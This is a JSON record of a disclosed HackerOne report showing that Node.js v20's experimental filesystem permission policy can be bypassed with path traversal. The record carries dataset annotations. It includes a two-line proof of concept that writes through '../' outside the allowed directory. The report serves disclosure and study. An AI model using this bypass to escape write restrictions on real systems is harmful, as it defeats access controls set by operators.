{
    "reported_to": "Node.js",
    "reported_by": "haxatron1 ",
    "title": "Filesystem experimental permissions policy does not handle path traversal cases.",
    "content": "\nConsider the following command on Node v20.0.0:\nCode 95 Bytes\n1node --experimental-permission --allow-fs-read=* --allow-fs-write=/home/kali/restricted/ poc.js\nThis command is intended to restrict write access to only files present in the directory /home/kali/restricted\nHowever if we have the following poc.js:\nCode 110 Bytes\n1const fs = module.require('fs')\n2fs.writeFileSync(\"/home/kali/restricted/../secret.txt\", \"Target Overwritten!\")\nThis apparently matches the directory /home/kali/restricted/ directory check and then writes to /home/kali/secret.txt (by using ../), which is not intended, bypassing the experimental permission policy for files.\nImpact\nPath traversal when checking experimental file permission policy\n\n",
    "severity": [
        7.7,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Path Traversal"
    ],
    "screenshots": {},
    "disclosed_date": 1689901020,
    "report_url": "https://hackerone.com/reports/1952978",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Run Node.js with experimental permissions enabled, allowing read access to all files but restricting write access to '/home/kali/restricted/' directory using the command: `node --experimental-permission --allow-fs-read=* --allow-fs-write=/home/kali/restricted/ poc.js`"
        ],
        [
            2,
            "In the `poc.js` file, use path traversal (`../`) to write to a file outside the restricted directory, e.g., `fs.writeFileSync(\"/home/kali/restricted/../secret.txt\", \"Target Overwritten!\")`"
        ]
    ],
    "vuln_description": "The Node.js experimental permissions policy fails to properly handle path traversal cases, allowing an attacker to bypass directory restrictions by using '../' in file paths. This enables writing to files outside the intended restricted directory.",
    "reason": "The vulnerability involves a straightforward exploitation of path traversal, a well-known technique, and does not require complex interactions or novel logic. The issue is in the permission policy's failure to resolve and validate canonical paths.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}